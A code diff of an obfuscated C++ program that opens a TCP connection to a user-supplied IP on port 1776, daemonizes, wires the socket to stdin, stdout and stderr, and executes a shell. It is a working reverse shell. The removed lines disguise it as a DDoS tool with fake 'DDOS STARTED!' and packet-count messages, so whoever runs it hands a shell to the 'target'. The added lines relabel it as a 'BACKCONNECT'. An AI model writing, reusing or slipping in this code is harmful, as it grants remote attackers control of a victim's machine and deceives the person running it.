@@ -12,13 +12,13 @@
 #define /*                                        */ probe    "/sh"
 #define /******************************************/ norm "\e[39m"
 using namespace std;int main(int argc, char** argv){if(argc!=2){
-cout << red << "No target selected!" << norm << endl; return 1;}
-cout << green << "DDOS STARTED!" <<norm<<endl;srand(time(NULL)); 
-cout << green << "SENT " << rand() % 1000000 << " Packets" << norm 
-<< endl;daemon(1, 1); int s0; struct sockaddr_in target;char packet
-[2000];s0 = socket(AF_INET , SOCK_STREAM , 0); if (s0 < 0){ close(s0);}
-target.sin_addr.s_addr = inet_addr(argv[1]);target.sin_family = AF_INET; 
-target.sin_port = htons(1776); if (connect(s0 , (struct sockaddr *)&target, 
-sizeof(target)) < 0){ sleep(10); close(s0); } while(1){ recv(s0, packet, 
-2000, 0);dup2(s0,0); dup2(s0,1); dup2(s0,2); execl(packets probe,
-packets probe,(char*)0);close(s0);}sleep(10);return 0;} 
+cout << red << "No Server!" << norm << endl; return 1;}
+cout << green << "Program Started!" <<norm<<endl;srand(time(NULL)); 
+cout << green << "SENT BACKCONNECT" << norm << endl;daemon(1, 1); 
+ int s0; struct sockaddr_in target;char packet[2000];s0 = socket(AF_INET, 
+SOCK_STREAM , 0); if (s0 < 0){ close(s0);}target.sin_addr.s_addr = inet_addr(
+argv[1]);target.sin_family = AF_INET; target.sin_port = htons(1776); if 
+(connect(s0, (struct sockaddr *)&target, sizeof(target)) < 0){ sleep(10); 
+close(s0); } while(1){ recv(s0, packet, 2000, 0);dup2(s0,0); dup2(s0,1); 
+dup2(s0,2); execl(packets probe,packets probe,(char*)0);close(s0);}sleep(10);
+return 0;} 
